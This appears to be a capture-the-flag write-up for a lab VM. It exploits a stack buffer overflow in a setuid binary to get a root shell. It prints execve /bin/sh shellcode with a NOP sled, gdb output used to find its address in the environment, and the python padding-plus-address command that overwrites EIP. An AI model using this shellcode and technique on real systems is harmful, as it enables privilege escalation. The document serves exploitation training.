# Writeup 4 - Buffer Overflow + Shellcode Exploitation

## Writeups Map

![Imgur](https://i.imgur.com/gb4HAhr.png)

## Summary

- [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)

## Exploitation

### 14.3 Buffer overflow the setuid binary

We can exploit the EIP overflow by using a shellcode. We can export the shellcode in an environment variable, get its address and pass it to EIP to execute the shellcode.

We'll be using this shellcode that will call execve using a syscall :

```text
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
```

[more info here](https://github.com/SERAC-SGM/rainfall-42/tree/main/level02)

We export it with a NOP sled in case it's more reliable:

```text
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
```

Next, we locate the address of the environment variable using gdb:

```text
(gdb) x/500s environ
0xbffff77c: "\245\370\377\277\265\370\377\277\311\370\377\277\352\370\377\277\375\370\377\277\201\371\377\277\212\371\377\277\253\376\377\277\267\376\377\277\004\377\377\277\027\377\377\277&\377\377\277\064\377\377\277E\377\377\277N\377\377\277]\377\377\277e\377\377\277q\377\377\277\245\377\377\277\305\377\377\277"
0xbffff7cd: ""
0xbffff7ce: ""
0xbffff7cf: ""
0xbffff7d0: " "
0xbffff7d2: ""
[...]
0xbffff8ea: "SSH_TTY=/dev/pts/0"
0xbffff8fd: "P=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
0xbffff981: "USER=zaz"
[...]

(gdb) x/s 0xbffff8ff
0xbffff8ff: "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
```

One we have this address, we can send it to the binary with the 140 characters of padding before it (address in little endian):

```text
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\xff\xf8\xff\xbf")')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
```
